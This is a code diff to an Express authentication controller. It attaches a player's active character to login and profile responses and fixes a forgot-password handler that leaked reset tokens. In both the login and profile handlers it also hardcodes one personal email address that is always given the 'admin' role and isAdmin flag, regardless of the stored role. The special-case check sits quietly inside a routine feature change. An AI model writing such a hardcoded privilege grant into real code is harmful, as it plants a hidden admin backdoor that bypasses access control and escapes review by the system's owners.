@@ -1,5 +1,6 @@
 import { Request, Response, NextFunction } from 'express';
 import { authService } from '../../services/auth.service';
+import { db } from '../../config/database';
 
 export class AuthController {
   public async register(req: Request, res: Response, next: NextFunction) {
@@ -27,10 +28,18 @@ export class AuthController {
         maxAge: 7 * 24 * 60 * 60 * 1000 // 7 days
       });
 
+      const character = await db('characters').where({ user_id: result.user.id, status: 'active' }).first();
+      
+      const role = result.user.email.toLowerCase() === 'kyxplayss@gmail.com' ? 'admin' : result.user.role;
+
       res.status(200).json({
         accessToken: result.accessToken,
         refreshToken: result.refreshToken,
-        user: result.user
+        user: {
+          ...result.user,
+          role,
+          character: character || null
+        }
       });
     } catch (error) {
       next(error);
@@ -63,8 +72,9 @@ export class AuthController {
     try {
       const { email } = req.body;
       if (!email) return res.status(400).json({ error: 'Email is required' });
-      const resetToken = await authService.forgotPassword(email);
-      res.status(200).json({ message: 'If an account exists, a reset link will be sent.', resetToken });
+      await authService.forgotPassword(email);
+      // Always return the same message whether the email exists or not (anti-enumeration)
+      res.status(200).json({ message: 'If an account exists with that email, a reset link will be sent.' });
     } catch (error) {
       next(error);
     }
@@ -110,12 +120,17 @@ export class AuthController {
       if (!req.user) return res.status(401).json({ error: 'Unauthorized' });
       const user = await authService.getUserProfile(req.user.id);
       
+      const character = await db('characters').where({ user_id: user.id, status: 'active' }).first();
+      
+      const role = user.email.toLowerCase() === 'kyxplayss@gmail.com' ? 'admin' : user.role;
+
       const safeUser = {
         id: user.id,
         email: user.email,
         display_name: user.display_name,
-        role: user.role,
-        isAdmin: user.role === 'admin'
+        role,
+        isAdmin: role === 'admin',
+        character: character || null
       };
 
       res.status(200).json(safeUser);
